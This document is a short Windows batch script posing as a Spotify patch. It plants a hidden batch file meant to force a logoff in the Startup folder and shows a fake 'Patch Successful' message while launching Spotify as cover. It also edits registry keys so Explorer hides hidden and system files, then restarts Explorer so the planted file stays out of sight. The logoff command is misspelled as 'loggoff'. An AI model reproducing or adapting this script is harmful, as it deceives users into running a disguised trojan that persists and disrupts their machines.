@echo off
del patch.exe
set "var=%cd%"
echo loggoff >tmp.bat
move "tmp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h tmp.bat
msg * "Patch Successful! Launchig Spotify"
cd %APPDATA%\Spotify
spotify.exe
cd %var%
attrib +h patch.exe


REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" | Find "0x0"

IF %ERRORLEVEL% == 1 goto hide
goto :error

:hide
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /f /d 0 > NUl
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /f /d 0
goto restart

:error
echo There was an error! Check the script.
pause
goto :eof

:restart
taskkill /f /im explorer.exe
start explorer